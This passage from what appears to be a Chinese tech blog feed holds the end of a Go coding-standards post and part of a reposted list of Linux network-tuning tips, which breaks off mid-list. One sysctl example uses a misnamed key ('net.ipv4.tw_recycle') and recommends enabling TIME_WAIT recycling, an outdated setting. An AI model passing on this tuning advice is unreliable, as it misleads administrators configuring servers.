tmp<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">BenchmarkRangeStruct</span><span class="hljs-params">(b *testing.B)</span></span> &#123;<br><span class="hljs-keyword">var</span> items [<span class="hljs-number">1024</span>]Item<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; b.N; i++ &#123;<br><span class="hljs-keyword">var</span> tmp <span class="hljs-type">int</span><br><span class="hljs-keyword">for</span> _, item := <span class="hljs-keyword">range</span> items &#123;<br>tmp = item.id<br>&#125;<br>_ = tmp<br>&#125;<br>&#125;<br><br>BenchmarkForStruct<span class="hljs-number">-8</span>             <span class="hljs-number">3769580</span>               <span class="hljs-number">324</span> ns/op<br>BenchmarkRangeIndexStruct<span class="hljs-number">-8</span>      <span class="hljs-number">3597555</span>               <span class="hljs-number">330</span> ns/op<br>BenchmarkRangeStruct<span class="hljs-number">-8</span>              <span class="hljs-number">2194</span>            <span class="hljs-number">467411</span> ns/op<br></code></pre></td></tr></table></figure><ul><li>仅遍历下标的情况下，for 和 range 的性能几乎是一样的。</li><li><code>items</code> 的每一个元素的类型是一个结构体类型 <code>Item</code>，<code>Item</code> 由两个字段构成，一个类型是 int，一个是类型是 <code>[4096]byte</code>，也就是说每个 <code>Item</code> 实例需要申请约 4KB 的内存。</li><li>在这个例子中，for 的性能大约是 range (同时遍历下标和值) 的 2000 倍。</li></ul><p>参考链接：<a href="https://geektutu.com/post/hpg-range.html">https://geektutu.com/post/hpg-range.html</a></p><h3 id="3-6-避免使用反射"><a href="#3-6-避免使用反射" class="headerlink" title="3.6 避免使用反射"></a>3.6 避免使用反射</h3><p>使用反射赋值，效率非常低下，如果有替代方案，尽可能避免使用反射，特别是会被反复调用的热点代码。例如 RPC 协议中，需要对结构体进行序列化和反序列化，这个时候避免使用 Go 语言自带的 <code>json</code> 的 <code>Marshal</code> 和 <code>Unmarshal</code> 方法，因为标准库中的 json 序列化和反序列化是利用反射实现的。可选的替代方案有 <a href="https://github.com/mailru/easyjson">easyjson</a>，在大部分场景下，相比标准库，有 5 倍左右的性能提升。</p><p>参考链接：<a href="https://geektutu.com/post/hpg-reflect.html">https://geektutu.com/post/hpg-reflect.html</a></p><h3 id="3-7-空结构体-struct-的使用"><a href="#3-7-空结构体-struct-的使用" class="headerlink" title="3.7 空结构体 struct{} 的使用"></a>3.7 空结构体 struct{} 的使用</h3><p>因为空结构体不占据内存空间，因此被广泛作为各种场景下的占位符使用。一是节省资源，二是空结构体本身就具备很强的语义，即这里不需要任何值，仅作为占位符。</p><h3 id="3-8-内存对齐对性能的影响"><a href="#3-8-内存对齐对性能的影响" class="headerlink" title="3.8 内存对齐对性能的影响"></a>3.8 <a href="https://geektutu.com/post/hpg-struct-alignment.html">内存对齐对性能的影响</a></h3><h2 id="4-异常"><a href="#4-异常" class="headerlink" title="4 异常"></a>4 异常</h2><h3 id="4-1-异常处理"><a href="#4-1-异常处理" class="headerlink" title="4.1 异常处理"></a>4.1 异常处理</h3><ul><li>【强制】程序中出现的任何异常都必须处理，不能忽略。</li><li>【强制】错误描述必须为小写，不需要标点结尾。</li><li>【推荐】程序中尽量避免使用panic来进行异常处理。对于必须要使用panic进行异常处理的场景，应该保证能够在单元测试或集成测试中覆盖到此场景。同时要在非测试场景下，启用recover能力。</li></ul><h3 id="4-2-日志规约"><a href="#4-2-日志规约" class="headerlink" title="4.2 日志规约"></a>4.2 日志规约</h3><ul><li>【推荐】日志采用分级打印方式，包含Info, Warning，Error和自定义等级。统一使用blog日志包进行日志的管理。</li><li>【强制】日志的内容要详尽，至少包含这几个要素：谁在什么情况下，因为什么原因，出现了什么异常，会引起什么问题。方便异常的定位。</li><li>【强制】Info级别用于打印在程序运行过程中必须要打印的日志信息。不能包含调试等日志信息。</li><li>【强制】Warning级别用于打印程序运行过程中出现的异常，但不影响程序的正常运行，需要通过Warning级别日志进行提示。</li><li>【强制】Error级别用于打印程序运行过程中出现的会影响业务正常运行逻辑的异常。</li><li>【推荐】对于自定义等级的日志，默认3级为debug日志。自定义日志的级别可根据自身需求进行调整。</li><li>【推荐】底层公共库中的异常应该抛出，不建议在公共库中打印相关的日志信息，应该由上层的逻辑层处理异常，并打印日志信息。</li></ul><h2 id="5-单元测试"><a href="#5-单元测试" class="headerlink" title="5 单元测试"></a>5 单元测试</h2><ul><li>【强制】单元测试必须遵守 AIR 原则，即具有自动化、独立性、可重复执行的特点。</li><li>【强制】单元测试应该是全自动执行的，并且非交互式的。测试用例通常是被定期执行的，执行过程必须完全自动化才有意义。输出结果禁止进行人工验证。</li><li>【强制】保持单元测试的独立性。为了保证单元测试稳定可靠且便于维护，单元测试用例之间禁止互相调用，也不能依赖执行的先后次序。</li><li>【强制】新增代码及时补充单元测试，如果新增代码影响了原有单元测试，请及时修正。</li><li>【推荐】对于不可测的代码建议做必要的重构，使代码变得可测，避免为了达到测试要求而编写不规范测试代码。</li><li>【推荐】在设计评审阶段，开发人员需要和测试人员一起确定单元测试范围，单元测试最好 覆盖所有测试用例。</li></ul><h3 id="5-1-用例编写原则"><a href="#5-1-用例编写原则" class="headerlink" title="5.1 用例编写原则"></a>5.1 用例编写原则</h3><p>当测试逻辑是重复的时候，通过 <a href="https://blog.golang.org/subtests">subtests</a> 使用 table 驱动的方式编写 case 代码看上去会更简洁。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs go">正例：<br><span class="hljs-comment">// func TestSplitHostPort(t *testing.T)</span><br><br>tests := []<span class="hljs-keyword">struct</span>&#123;<br>  give     <span class="hljs-type">string</span><br>  wantHost <span class="hljs-type">string</span><br>  wantPort <span class="hljs-type">string</span><br>&#125;&#123;<br>  &#123;<br>    give:     <span class="hljs-string">&quot;192.0.2.0:8000&quot;</span>,<br>    wantHost: <span class="hljs-string">&quot;192.0.2.0&quot;</span>,<br>    wantPort: <span class="hljs-string">&quot;8000&quot;</span>,<br>  &#125;,<br>  &#123;<br>    give:     <span class="hljs-string">&quot;192.0.2.0:http&quot;</span>,<br>    wantHost: <span class="hljs-string">&quot;192.0.2.0&quot;</span>,<br>    wantPort: <span class="hljs-string">&quot;http&quot;</span>,<br>  &#125;,<br>  &#123;<br>    give:     <span class="hljs-string">&quot;:8000&quot;</span>,<br>    wantHost: <span class="hljs-string">&quot;&quot;</span>,<br>    wantPort: <span class="hljs-string">&quot;8000&quot;</span>,<br>  &#125;,<br>  &#123;<br>    give:     <span class="hljs-string">&quot;1:8&quot;</span>,<br>    wantHost: <span class="hljs-string">&quot;1&quot;</span>,<br>    wantPort: <span class="hljs-string">&quot;8&quot;</span>,<br>  &#125;,<br>&#125;<br><br><span class="hljs-keyword">for</span> _, tt := <span class="hljs-keyword">range</span> tests &#123;<br>  t.Run(tt.give, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t *testing.T)</span></span> &#123;<br>    host, port, err := net.SplitHostPort(tt.give)<br>    require.NoError(t, err)<br>    assert.Equal(t, tt.wantHost, host)<br>    assert.Equal(t, tt.wantPort, port)<br>  &#125;)<br>&#125;<br>反例：<br><span class="hljs-comment">// func TestSplitHostPort(t *testing.T)</span><br><br>host, port, err := net.SplitHostPort(<span class="hljs-string">&quot;192.0.2.0:8000&quot;</span>)<br>require.NoError(t, err)<br>assert.Equal(t, <span class="hljs-string">&quot;192.0.2.0&quot;</span>, host)<br>assert.Equal(t, <span class="hljs-string">&quot;8000&quot;</span>, port)<br><br>host, port, err = net.SplitHostPort(<span class="hljs-string">&quot;192.0.2.0:http&quot;</span>)<br>require.NoError(t, err)<br>assert.Equal(t, <span class="hljs-string">&quot;192.0.2.0&quot;</span>, host)<br>assert.Equal(t, <span class="hljs-string">&quot;http&quot;</span>, port)<br><br>host, port, err = net.SplitHostPort(<span class="hljs-string">&quot;:8000&quot;</span>)<br>require.NoError(t, err)<br>assert.Equal(t, <span class="hljs-string">&quot;&quot;</span>, host)<br>assert.Equal(t, <span class="hljs-string">&quot;8000&quot;</span>, port)<br><br>host, port, err = net.SplitHostPort(<span class="hljs-string">&quot;1:8&quot;</span>)<br>require.NoError(t, err)<br>assert.Equal(t, <span class="hljs-string">&quot;1&quot;</span>, host)<br>assert.Equal(t, <span class="hljs-string">&quot;8&quot;</span>, port)<br></code></pre></td></tr></table></figure><p>很明显，使用 test table 的方式在代码逻辑扩展的时候，比如新增 test case，都会显得更加的清晰。</p><p>我们遵循这样的约定：将结构体切片称为<code>tests</code>。 每个测试用例称为<code>tt</code>。</p><h2 id="6-工程结构"><a href="#6-工程结构" class="headerlink" title="6 工程结构"></a>6 工程结构</h2><ul><li><p>【推荐】项目名可以通过中划线来连接多个单词。</p></li><li><p>【强制】工程目录名称只能使用英文小写字母</p></li><li><p>【推荐】保持 package 的名字和目录一致，包名应该为小写单词，不要使用下划线或者混合大小写，使用多级目录来划分层级。</p></li><li><p>【强制】文件名只能使用英文小写字母，如果有多个单词，中间可以使用下划线进行分隔。命名尽量望文生义。</p></li><li><p>【强制】当命名包时，请按下面规则选择一个名称：</p><ul><li>全部小写。没有大写或下划线。</li><li>大多数使用命名导入的情况下，不需要重命名。</li><li>简短而简洁。请记住，在每个使用的地方都完整标识了该名称。</li><li>不用复数。例如<code>net/url</code>，而不是<code>net/urls</code>。</li><li>不要用“common”，“util”，“shared”或“lib”。这些是不好的，信息量不足的名称。</li></ul><p>另请参阅 <a href="https://blog.golang.org/package-names">Go 包命名规则</a> 和 <a href="https://rakyll.org/style-packages/">Go 包样式指南</a>.</p></li><li><p>【强制】工程中引入(import)的包，不能使用相对路径。必须使用相对于GOPATH的完整路径。</p><p>反例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;errors&quot;</span><br><br>    <span class="hljs-string">&quot;../../apimachinery/discovery&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>【强制】如果程序包名称与导入路径的最后一个元素不匹配，则必须使用导入别名。</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">import</span> (<br>  <span class="hljs-string">&quot;net/http&quot;</span><br><br>  client <span class="hljs-string">&quot;example.com/client-go&quot;</span><br>  <span class="hljs-built_in">trace</span> <span class="hljs-string">&quot;example.com/trace/v2&quot;</span><br>)<br></code></pre></td></tr></table></figure></li><li><p>【强制】工程中引入的包，需要按照“<strong>标准库包、工程内部包、第三方包”</strong>的顺序进行组织。三种包之间用空行进行分隔，这样在gofmt时不会打乱三种包之间的顺序。</p><p>正例：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs golang"><span class="hljs-keyword">import</span> (<br>    <span class="hljs-string">&quot;fmt&quot;</span><br>    <span class="hljs-string">&quot;context&quot;</span><br>    <span class="hljs-string">&quot;errors&quot;</span><br><br>    <span class="hljs-string">&quot;configcenter/src/apimachinery/discovery&quot;</span><br>    <span class="hljs-string">&quot;configcenter/src/apimachinery/rest&quot;</span><br>    <span class="hljs-string">&quot;configcenter/src/apimachinery/util&quot;</span><br><br>    <span class="hljs-string">&quot;github.com/juju/ratelimit&quot;</span><br>)<br></code></pre></td></tr></table></figure></li></ul><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ul><li><a href="https://golang.org/doc/effective_go.html">https://golang.org/doc/effective_go.html</a></li><li><a href="https://github.com/golang/go/wiki/CodeReviewComments">https://github.com/golang/go/wiki/CodeReviewComments</a></li><li><a href="https://github.com/TencentBlueKing/bk-bcs/blob/master/docs/specification/blueking-golang-code-conduct1.0.1.md">https://github.com/TencentBlueKing/bk-bcs/blob/master/docs/specification/blueking-golang-code-conduct1.0.1.md</a></li><li><a href="https://github.com/xxjwxc/uber_go_guide_cn#%E4%BC%98%E5%85%88%E4%BD%BF%E7%94%A8-strconv-%E8%80%8C%E4%B8%8D%E6%98%AF-fmt">https://github.com/xxjwxc/uber_go_guide_cn#%E4%BC%98%E5%85%88%E4%BD%BF%E7%94%A8-strconv-%E8%80%8C%E4%B8%8D%E6%98%AF-fmt</a></li><li><a href="https://golang.org/doc/effective_go.html">Effective Go</a></li><li><a href="https://github.com/golang/go/wiki/CommonMistakes">Go Common Mistakes</a></li><li><a href="https://github.com/golang/go/wiki/CodeReviewComments">Go Code Review Comments</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>golang</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创</tag>
      
      <tag>golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于 Linux 网络性能的 15 个优化建议</title>
    <link href="/2023/03/18/%E7%BD%91%E7%BB%9C%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE/"/>
    <url>/2023/03/18/%E7%BD%91%E7%BB%9C%E4%BC%98%E5%8C%96%E5%BB%BA%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="关于-Linux-网络性能的-15-个优化建议"><a href="#关于-Linux-网络性能的-15-个优化建议" class="headerlink" title="关于 Linux 网络性能的 15 个优化建议"></a>关于 Linux 网络性能的 15 个优化建议</h1><blockquote><p>转载自张彦飞的<a href="https://zhuanlan.zhihu.com/p/532492257">关于 Linux 网络性能的 15 个优化建议！</a></p></blockquote><h3 id="建议1：尽量减少不必要的网络-IO"><a href="#建议1：尽量减少不必要的网络-IO" class="headerlink" title="建议1：尽量减少不必要的网络 IO"></a><strong>建议1：尽量减少不必要的网络 IO</strong></h3><p>我要给出的第一个建议就是不必要用网络 IO 的尽量不用。</p><p>是的，网络在现代的互联网世界里承载了很重要的角色。用户通过网络请求线上服务、服务器通过网络读取数据库中数据，通过网络构建能力无比强大分布式系统。网络很好，能降低模块的开发难度，也能用它搭建出更强大的系统。但是这不是你滥用它的理由！</p><p>原因是即使是本机网络 IO 开销仍然是很大的。先说发送一个网络包，首先得从用户态切换到内核态，花费一次系统调用的开销。进入到内核以后，又得经过冗长的协议栈，这会花费不少的 CPU 周期，最后进入环回设备的“驱动程序”。接收端呢，软中断花费不少的 CPU 周期又得经过接收协议栈的处理，最后唤醒或者通知用户进程来处理。当服务端处理完以后，还得把结果再发过来。又得来这么一遍，最后你的进程才能收到结果。你说麻烦不麻烦。另外还有个问题就是多个进程协作来完成一项工作就必然会引入更多的进程上下文切换开销，这些开销从开发视角来看，做的其实都是无用功。</p><p>上面我们还分析的只是本机网络 IO，如果是跨机器的还得会有双方网卡的 DMA 拷贝过程，以及两端之间的网络 RTT 耗时延迟。所以，网络虽好，但也不能随意滥用！</p><h3 id="建议2：尽量合并网络请求"><a href="#建议2：尽量合并网络请求" class="headerlink" title="建议2：尽量合并网络请求"></a><strong>建议2：尽量合并网络请求</strong></h3><p>在可能的情况下，尽可能地把多次的网络请求合并到一次，这样既节约了双端的 CPU 开销，也能降低多次 RTT 导致的耗时。</p><p>我们举个实践中的例子可能更好理解。假如有一个 redis，里面存了每一个 App 的信息（应用名、包名、版本、截图等等）。你现在需要根据用户安装应用列表来查询数据库中有哪些应用比用户的版本更新，如果有则提醒用户更新。</p><p>那么最好不要写出如下的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">&lt;?php <br><span class="hljs-title function_">for</span><span class="hljs-params">(安装列表 as 包名)</span>&#123;<br>  redis-&gt;get(包名)<br>  ...<br>&#125;<br></code></pre></td></tr></table></figure><p>上面这段代码功能上实现上没问题，问题在于性能。据我们统计现代用户平均安装 App 的数量在 60 个左右。那这段代码在运行的时候，每当用户来请求一次，你的服务器就需要和 redis 进行 60 次网络请求。 总耗时最少是 60 个 RTT 起。更好的方法是应该使用 redis 中提供的批量获取命令，如 hmget、pipeline等，经过一次网络 IO 就获取到所有想要的数据，如图。</p><p><img src="https://pic3.zhimg.com/80/v2-ecba57083233d47733edac2ad082250e_1440w.webp" alt="img"></p><h3 id="建议3：调用者与被调用机器尽可能部署的近一些"><a href="#建议3：调用者与被调用机器尽可能部署的近一些" class="headerlink" title="建议3：调用者与被调用机器尽可能部署的近一些"></a><strong>建议3：调用者与被调用机器尽可能部署的近一些</strong></h3><p>在前面的章节中我们看到在握手一切正常的情况下， TCP 握手的时间基本取决于两台机器之间的 RTT 耗时。虽然我们没办法彻底去掉这个耗时，但是我们却有办法把 RTT 降低，那就是把客户端和服务器放的足够地近一些。尽量把每个机房内部的数据请求都在本地机房解决，减少跨地网络传输。</p><p>举例，假如你的服务是部署在北京机房的，你调用的 mysql、redis最好都位于北京机房内部。尽量不要跨过千里万里跑到广东机房去请求数据，即使你有专线，耗时也会大大增加！在机房内部的服务器之间的 RTT 延迟大概只有零点几毫秒，同地区的不同机房之间大约是 1 ms 多一些。但如果从北京跨到广东的话，延迟将是 30 - 40 ms 左右，几十倍的上涨！</p><h3 id="建议4：内网调用不要用外网域名"><a href="#建议4：内网调用不要用外网域名" class="headerlink" title="建议4：内网调用不要用外网域名"></a><strong>建议4：内网调用不要用外网域名</strong></h3><p>假如说你所在负责的服务需要调用兄弟部门的一个搜索接口，假设接口是：”<a href="https://link.zhihu.com/?target=http://www.sogou.com/wq?key=">http://www.sogou.com/wq?key=</a>开发内功修炼”。</p><p>那既然是兄弟部门，那很可能这个接口和你的服务是部署在一个机房的。即使没有部署在一个机房，一般也是有专线可达的。<strong>所以不要直接请求 <a href="https://link.zhihu.com/?target=http://www.sogou.com">http://www.sogou.com</a>， 而是应该使用该服务在公司对应的内网域名</strong>。在我们公司内部，每一个外网服务都会配置一个对应的内网域名，我相信你们公司也有。</p><p>为什么要这么做，原因有以下几点</p><p>1）<strong>外网接口慢</strong>。本来内网可能过个交换机就能达到兄弟部门的机器，非得上外网兜一圈再回来，时间上肯定会慢。</p><p>2）<strong>带宽成本高</strong>。在互联网服务里，除了机器以外，另外一块很大的成本就是 IDC 机房的出入口带宽成本。 两台机器在内网不管如何通信都不涉及到带宽的计算。但是一旦你去外网兜了一圈回来，行了，一进一出全部要缴带宽费，你说亏不亏！！</p><p>3）<strong>NAT 单点瓶颈</strong>。一般的服务器都没有外网 IP，所以要想请求外网的资源，必须要经过 NAT 服务器。但是一个公司的机房里几千台服务器中，承担 NAT 角色的可能就那么几台。它很容易成为瓶颈。我们的业务就遇到过好几次 NAT 故障导致外网请求失败的情形。 NAT 机器挂了，你的服务可能也就挂了，故障率大大增加。</p><h3 id="建议5：调整网卡-RingBuffer-大小"><a href="#建议5：调整网卡-RingBuffer-大小" class="headerlink" title="建议5：调整网卡 RingBuffer 大小"></a><strong>建议5：调整网卡 RingBuffer 大小</strong></h3><p>在 Linux 的整个网络栈中，RingBuffer 起到一个任务的收发中转站的角色。对于接收过程来讲，网卡负责往 RingBuffer 中写入收到的数据帧，ksoftirqd 内核线程负责从中取走处理。只要 ksoftirqd 线程工作的足够快，RingBuffer 这个中转站就不会出现问题。</p><p>但是我们设想一下，假如某一时刻，瞬间来了特别多的包，而 ksoftirqd 处理不过来了，会发生什么？这时 RingBuffer 可能瞬间就被填满了，后面再来的包网卡直接就会丢弃，不做任何处理！</p><p><img src="https://pic2.zhimg.com/80/v2-20ebecf23bb2e7efab54133b78942b79_1440w.webp" alt="img"></p><p>通过 ethtool 就可以加大 RingBuffer 这个“中转仓库”的大小。。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text"># ethtool -G eth1 rx 4096 tx 4096<br></code></pre></td></tr></table></figure><p><img src="https://pic3.zhimg.com/80/v2-789483747c518d6a4459031d0f77c33a_1440w.webp" alt="img"></p><p>这样网卡会被分配更大一点的”中转站“，可以解决偶发的瞬时的丢包。不过这种方法有个小副作用，那就是排队的包过多会增加处理网络包的延时。所以应该让内核处理网络包的速度更快一些更好，而不是让网络包傻傻地在 RingBuffer 中排队。我们后面会再介绍到 RSS ，它可以让更多的核来参与网络包接收。</p><h3 id="建议6：减少内存拷贝"><a href="#建议6：减少内存拷贝" class="headerlink" title="建议6：减少内存拷贝"></a><strong>建议6：减少内存拷贝</strong></h3><p>假如你要发送一个文件给另外一台机器上，那么比较基础的做法是先调用 read 把文件读出来，再调用 send 把数据把数据发出去。这样数据需要频繁地在内核态内存和用户态内存之间拷贝，如图</p><p><img src="https://pic2.zhimg.com/80/v2-42a7e0ffd0d22771ff9c2d5d0692de35_1440w.webp" alt="img"></p><p>目前减少内存拷贝主要有两种方法，分别是使用 mmap 和 sendfile 两个系统调用。使用 mmap 系统调用的话，映射进来的这段地址空间的内存在用户态和内核态都是可以使用的。如果你发送数据是发的是 mmap 映射进来的数据，则内核直接就可以从地址空间中读取，这样就节约了一次从内核态到用户态的拷贝过程。</p><p><img src="https://pic3.zhimg.com/80/v2-5d2688c2577cbb426f70146436cc92fa_1440w.webp" alt="img"></p><p>不过在 mmap 发送文件的方式里，系统调用的开销并没有减少，还是发生两次内核态和用户态的上下文切换。 如果你只是想把一个文件发送出去，而不关心它的内容，则可以调用另外一个做的更极致的系统调用 - sendfile。在这个系统调用里，彻底把读文件和发送文件给合并起来了，系统调用的开销又省了一次。再配合绝大多数网卡都支持的”分散-收集”（Scatter-gather）DMA 功能。可以直接从 PageCache 缓存区中 DMA 拷贝到网卡中，如图 9.8。这样绝大部分的 CPU 拷贝操作就都省去了。</p><p><img src="https://pic1.zhimg.com/80/v2-6fb30b17a5ecfdc8c99a8a9c2964a6e8_1440w.webp" alt="img"></p><h3 id="建议7：使用-eBPF-绕开协议栈的本机-IO"><a href="#建议7：使用-eBPF-绕开协议栈的本机-IO" class="headerlink" title="建议7：使用 eBPF 绕开协议栈的本机 IO"></a><strong>建议7：使用 eBPF 绕开协议栈的本机 IO</strong></h3><p>如果你的业务中涉及到大量的本机网络 IO 可以考虑这个优化方案。本机网络 IO 和跨机 IO 比较起来，确实是节约了驱动上的一些开销。发送数据不需要进 RingBuffer 的驱动队列，直接把 skb 传给接收协议栈(经过软中断)。但是在内核其它组件上，可是一点都没少，系统调用、协议栈(传输层、网络层等)、设备子系统整个走 了一个遍。连“驱动”程序都走了(虽然对于回环设备来说这个驱动只是一个纯软件的虚拟出来的东东)。</p><p>如果想用本机网络 IO，但是又不想频繁地在协议栈中绕来绕去。那么你可以试试 eBPF。使用 eBPF 的 sockmap 和 sk redirect 可以绕过 TCP&#x2F;IP 协议栈，而被直接发送给接收端的 socket，业界已经有公司在这么做了。</p><h3 id="建议8：-尽量少用-recvfrom-等进程阻塞的方式"><a href="#建议8：-尽量少用-recvfrom-等进程阻塞的方式" class="headerlink" title="建议8： 尽量少用 recvfrom 等进程阻塞的方式"></a><strong>建议8： 尽量少用 recvfrom 等进程阻塞的方式</strong></h3><p>在使用了 recvfrom 阻塞方式来接收 socket 上数据的时候。每次一个进程专⻔为了等一个 socket 上的数据就得被从 CPU 上拿下来。然后再换上另一个 进程。等到数据 ready 了，睡眠的进程又会被唤醒。总共两次进程上下文切换开销。如果我们服务器上需要有大量的用户请求需要处理，那就需要有很多的进程存在，而且不停地切换来切换去。这样的缺点有如下这么几个：</p><ul><li>因为每个进程只能同时等待一条连接，所以需要大量的进程。</li><li>进程之间互相切换的时候需要消耗很多 CPU 周期，一次切换大约是 3 - 5 us 左右。</li><li>频繁的切换导致 L1、L2、L3 等高速缓存的效果大打折扣</li></ul><p>大家可能以为这种网络 IO 模型很少见了。但其实在很多传统的客户端 SDK 中，比如 mysql、redis 和 kafka 仍然是沿用了这种方式。</p><h3 id="建议9：使用成熟的网络库"><a href="#建议9：使用成熟的网络库" class="headerlink" title="建议9：使用成熟的网络库"></a><strong>建议9：使用成熟的网络库</strong></h3><p>使用 epoll 可以高效地管理海量的 socket。在服务器端。我们有各种成熟的网络库进行使用。这些网络库都对 epoll 使用了不同程度的封装。</p><p>首先第一个要给大家参考的是 Redis。老版本的 Redis 里单进程高效地使用 epoll 就能支持每秒数万 QPS 的高性能。如果你的服务是单进程的，可以参考 Redis 在网络 IO 这块的源码。</p><p>如果是多线程的，线程之间的分工有很多种模式。那么哪个线程负责等待读 IO 事件，那个线程负责处理用户请求，哪个线程又负责给用户写返回。根据分工的不同，又衍生出单 Reactor、多 Reactor、以及 Proactor 等多种模式。大家也不必头疼，只要理解了这些原理之后选择一个性能不错的网络库就可以了。比如 PHP 中的 Swoole、Golang 的 net 包、Java 中的 netty 、C++ 中的 Sogou Workflow 都封装的非常的不错。</p><h3 id="建议10：使用-Kernel-ByPass-新技术"><a href="#建议10：使用-Kernel-ByPass-新技术" class="headerlink" title="建议10：使用 Kernel-ByPass 新技术"></a><strong>建议10：使用 Kernel-ByPass 新技术</strong></h3><p>如果你的服务对网络要求确实特别特特别的高，而且各种优化措施也都用过了，那么现在还有终极优化大招 – Kernel-ByPass 技术。</p><p>内核在接收网络包的时候要经过很⻓的收发路径。在这期间牵涉到很多内核组件之间的协同、协议栈的处理、以及内核态和用户态的拷贝和切换。 Kernel-ByPass 这类的技术方案就是绕开内核协议栈，自己在用户态来实现网络包的收发。这样不但避开了繁杂的内核协议栈处理，也减少了频繁了内核态用户态之间的拷贝和切换，性能将发挥到极致！</p><p>目前我所知道的方案有 SOLARFLARE 的软硬件方案、DPDK 等等。如果大家感兴趣，可以多去了解一下！</p><p><img src="https://pic3.zhimg.com/80/v2-72b4a6cc7f2e25bab8ffc5c843bd38da_1440w.webp" alt="img"></p><h3 id="建议11：配置充足的端口范围"><a href="#建议11：配置充足的端口范围" class="headerlink" title="建议11：配置充足的端口范围"></a><strong>建议11：配置充足的端口范围</strong></h3><p>客户端在调用 connect 系统调用发起连接的时候，需要先选择一个可用的端口。内核在选用端口的时候，是采用从可用端口范围中某一个随机位置开始遍历的方式。如果端口不充足的话，内核可能需要循环撞很多次才能选上一个可用的。这也会导致花费更多的 CPU 周期在内部的哈希表查找以及可能的自旋锁等待上。因此不要等到端口用尽报错了才开始加大端口范围，而且应该一开始的时候就保持一个比较充足的值。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># vi /etc/sysctl.conf</span><br>net.ipv4.ip_local_port_range = <span class="hljs-number">5000</span> <span class="hljs-number">65000</span><br><span class="hljs-comment"># sysctl -p  //使配置生效</span><br></code></pre></td></tr></table></figure><p>如果端口加大了仍然不够用，那么可以考虑开启端口 reuse 和 recycle。这样端口在连接断开的时候就不需要等待 2MSL 的时间了，可以快速回收。开启这个参数之前需要保证 tcp_timestamps 是开启的。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># vi /etc/sysctl.conf</span><br>net.ipv4.tcp_timestamps = <span class="hljs-number">1</span><br>net.ipv4.tcp_tw_reuse = <span class="hljs-number">1</span><br>net.ipv4.tw_recycle = <span class="hljs-number">1</span><br><span class="hljs-comment"># sysctl -p</span><br></code></pre></td></tr></table></figure><h3 id="建议12：小心连接队列溢出"><a href="#建议12：小心连接队列溢出" class="headerlink" title="建议12：小心连接队列溢出"></a><strong>建议12：小心连接队列溢出</strong></h3><p>服务器端使用了两个连接队列来响应来自客户端的握手请求。这两个队列的长度是在服务器 listen 的时候就确定好了的。如果发生溢出，很可能会丢包。所以如果你的业务使用的是短连接且流量比较大，那么一定得学会观察这两个队列是否存在溢出的情况。因为一旦出现因为连接队列导致的握手问题，那么 TCP 连接耗时都是秒级以上了。</p><p>对于半连接队列， 有个简单的办法。那就是只要保证 tcp_syncookies 这个内核参数是 1 